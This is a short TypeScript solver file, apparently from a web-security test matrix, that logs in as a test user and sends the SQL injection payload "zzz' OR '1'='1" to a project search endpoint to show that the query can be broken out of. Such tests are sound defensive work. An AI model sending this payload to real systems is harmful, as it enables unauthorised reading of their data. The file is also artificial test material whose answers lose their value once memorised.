// SQL injection in project search: close the string literal and add a boolean clause so the term
// spans more than a single SQL literal token.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const payload = "zzz' OR '1'='1"
  await ctx.fetch(ctx.path('searchProjects', {}, { q: payload }), { session: owner })
}
